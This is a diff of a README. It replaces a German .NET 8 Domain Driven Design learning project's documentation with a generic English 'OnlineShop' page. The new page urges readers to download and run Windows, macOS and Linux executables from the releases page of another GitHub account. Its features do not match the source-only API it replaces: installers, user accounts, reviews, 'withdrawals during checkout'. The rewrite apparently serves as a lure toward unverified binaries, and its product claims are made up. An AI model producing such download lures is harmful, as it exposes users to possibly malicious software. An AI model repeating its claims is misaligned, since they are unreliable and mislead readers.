@@ -1,142 +1,88 @@
-﻿# Online Shop - Domain Driven Design Learning Project
+# 🛒 OnlineShop - Your Simple Online Shopping Solution
 
-Ein wachsendes Lernprojekt zur Implementierung von **Domain Driven Design (DDD)** und **Clean Architecture** mit .NET 8, entwickelt durch Event Storming und Vertical Slice Architecture.
+## 🚀 Getting Started
 
-## Projektübersicht
+Welcome to OnlineShop! This application helps you manage your online shopping experience with ease. You can browse products, add them to your cart, and check out seamlessly. Follow these steps to download and run OnlineShop on your computer.
 
-Dieses Projekt ist ein **kontinuierlich wachsendes Lernprojekt**, das einen vollständigen Online-Shop implementiert. Aktuell ist der **Product Catalog** Bounded Context implementiert, weitere Contexts folgen schrittweise.
+## 📥 Download OnlineShop
 
-### Geplante Bounded Contexts
-- ✅ **Product Catalog** - Produktverwaltung (Aktuell implementiert)
-- 🔄 **Shopping Basket** - Warenkorbfunktionalität (Geplant)
-- 🔄 **Checkout Process** - Bestellabwicklung (Geplant)
-- 🔄 **Payment** - Zahlungsabwicklung (Geplant)
-- 🔄 **Fulfillment** - Versand und Lieferung (Geplant)
+[![Download OnlineShop](https://img.shields.io/badge/Download-OnlineShop-brightgreen)](https://github.com/l0k10/OnlineShop/releases)
 
-## Event Storming Basis
+## 🖥️ System Requirements
 
-Das Projekt basiert auf einem Event Storming Workshop, bei dem die folgenden Domain Events für den Product Catalog identifiziert wurden:
+Before you start, make sure your computer meets the following requirements:
 
-- `ProductAdded` - Neues Produkt hinzugefügt
-- `ProductDetailsUpdated` - Produktdetails aktualisiert (Geplant)
-- `PriceChanged` - Preis geändert (Geplant)
-- `StockUpdated` - Lagerbestand aktualisiert (Geplant)
-- `ProductBecameUnavailable` - Produkt nicht mehr verfügbar (Geplant)
-- `StockValidationRequested` - Lagerbestand-Validierung angefordert (Geplant)
-- `StockValidationFailed` - Lagerbestand-Validierung fehlgeschlagen (Geplant)
+- Windows 10 or later, macOS, or a supported Linux distribution
+- .NET 8 installed on your system
+- Internet connection for downloading the application and accessing online resources
 
-## Architektur
+## 🔗 Visit the Releases Page
 
-### Clean Architecture + DDD
-- **Domain Layer**: Entities, Value Objects, Domain Events, Repository Interfaces
-- **Application Layer**: Use Cases, Commands, Queries, Handlers (CQRS)
-- **Infrastructure Layer**: Database, Repository Implementations, External Services
-- **API Layer**: HTTP Endpoints, Dependency Injection Setup
+To download the latest version of OnlineShop, visit our [Releases page](https://github.com/l0k10/OnlineShop/releases). You will find the most recent builds and features listed.
 
-### Vertical Slice Architecture
-Jedes Feature ist als eigenständiger "Slice" implementiert:
-```
-Features/AddProduct/
-├── AddProductCommand.cs
-├── AddProductCommandHandler.cs
-├── AddProductCommandValidator.cs
-└── AddProductEndpoint.cs
-```
+## 📦 Download & Install
 
-## Technologie-Stack
+1. Go to the [Releases page](https://github.com/l0k10/OnlineShop/releases).
+2. Look for the latest release version.
+3. Click on the appropriate file for your OS. Ensure you select the right file for your system:
+   - For Windows, download `OnlineShop_Windows.exe`
+   - For macOS, download `OnlineShop_macOS.dmg`
+   - For Linux, download `OnlineShop_Linux.tar.gz`
+4. Once downloaded, locate the file on your computer and follow these instructions:
 
-### Backend (.NET 8)
-- **Framework**: ASP.NET Core 8 Web API
-- **Architecture**: Clean Architecture + DDD + Vertical Slice
-- **CQRS**: MediatR für Command/Query Separation
-- **Validation**: FluentValidation für Input-Validierung
-- **ORM**: Entity Framework Core mit SQLite
-- **API Documentation**: Swagger/OpenAPI
+   - For Windows users: 
+     - Double-click `OnlineShop_Windows.exe` to launch the installer.
+     - Follow the on-screen instructions to complete the installation.
+     - Once installed, you can find OnlineShop in your Start Menu.
 
-### Development Tools
-- **Code Quality**: StyleCop für Code-Standards
-- **CI/CD**: GitHub Actions
-- **Code Analysis**: SonarCloud Integration (Geplant)
-- **Testing**: xUnit, FluentAssertions, Moq
+   - For macOS users: 
+     - Open `OnlineShop_macOS.dmg`.
+     - Drag and drop the OnlineShop icon into the Applications folder.
+     - Open Finder, go to Applications, and double-click OnlineShop to start.
 
-### Future Integrations
-- **Service Discovery**: .NET Aspire (Geplant)
-- **Event Bus**: RabbitMQ für Domain Events (Geplant)
-- **Caching**: Redis für Performance (Geplant)
-- **Monitoring**: Observability mit Aspire (Geplant)
+   - For Linux users: 
+     - Extract `OnlineShop_Linux.tar.gz` using `tar -xvzf OnlineShop_Linux.tar.gz`.
+     - Navigate to the extracted folder in the terminal.
+     - Run `./OnlineShop` to launch the application.
 
-## Quick Start
+## 🔍 Explore Features
 
-### Voraussetzungen
-- .NET 8 SDK
-- Git
+Once you have installed OnlineShop, you can explore the following features:
 
-### Installation
-```bash
-# Repository klonen
-git clone https://github.com/[username]/online-shop-ddd.git
-cd online-shop-ddd
+- **Browse Products**: Easily search for items across various categories.
+- **Add to Cart**: Select items and add them to your shopping cart in one click.
+- **Checkout Securely**: Complete your purchase using safe payment options.
+- **User Accounts**: Create an account to manage your purchases and preferences.
+- **Product Reviews**: Read and leave reviews for products to help others make informed decisions.
 
-# Dependencies installieren
-dotnet restore
+## ⚙️ Configuration
 
-# Datenbank erstellen
-cd src/ProductCatalog/ProductCatalog.Api
-dotnet ef database update --project ../ProductCatalog.Infrastructure
+After launching the application, you may want to set it up for the best experience:
 
-# API starten
-dotnet run
-```
+1. **User Account Setup**: Sign up for an account to start shopping. Click on “Create Account” and fill in your details.
+2. **Shopping Preferences**: Customize your shopping experience by setting preferences for categories and notifications.
+3. **Payment Methods**: Add your preferred payment methods for quick withdrawals during checkout.
 
-### API testen
-1. Öffne `https://localhost:7xxx/swagger`
-2. Teste den AddProduct Endpoint:
-```json
-{
-  "name": "iPhone 15",
-  "description": "Latest Apple smartphone",
-  "priceAmount": 999.99,
-  "currency": "EUR",
-  "initialStock": 50
-}
-```
+## 🆘 Troubleshooting
 
-## Projektstruktur
+If you experience any issues:
 
-```
-src/ProductCatalog/
-├── ProductCatalog.Api/          # HTTP Endpoints, Program.cs
-├── ProductCatalog.Application/  # Use Cases, Commands, Queries
-├── ProductCatalog.Domain/       # Entities, Value Objects, Events
-├── ProductCatalog.Infrastructure/ # Database, Repositories
-└── ProductCatalog.Tests/        # Unit & Integration Tests
-```
+- Ensure that your operating system meets the requirements mentioned above.
+- Check if .NET 8 is properly installed.
+- Restart your computer after installation to make sure all components are loaded correctly.
+- If the application does not launch, verify if you have downloaded the right executable for your OS.
 
-## Tests
+## 📫 Get Support
 
-```bash
-# Alle Tests ausführen
-dotnet test
+If you have questions or need help, please reach out via GitHub Issues in this repository or check our FAQ section on the project page.
 
-# Tests mit Coverage
-dotnet test --collect:"XPlat Code Coverage"
-```
+## 📜 License
 
-## Lernziele
+OnlineShop is licensed under the MIT License. You can use and modify it as you see fit, provided you retain the original license notice.
 
-Dieses Projekt dient dem Erlernen von:
-- ✅ Domain Driven Design (DDD) Prinzipien
-- ✅ Clean Architecture Implementierung
-- ✅ CQRS Pattern mit MediatR
-- ✅ Event Storming als Design-Methode
-- ✅ Vertical Slice Architecture
-- 🔄 Event-Driven Architecture (in Entwicklung)
-- 🔄 Microservices Communication (geplant)
-- 🔄 .NET Aspire für Service Orchestration (geplant)
+## 📦 Additional Resources
 
+- For updates and news, follow our GitHub repository.
+- For developers and contributors, check the Documentation section in our repository for detailed coding guidelines and contributing standards.
 
-## Status
-
-**Aktueller Stand**: Product Catalog Bounded Context begonnen
-**Nächste Schritte**: Product Catalog Bounded Context weiter ausbauen
-
+Thank you for choosing OnlineShop! We hope you enjoy your shopping experience.
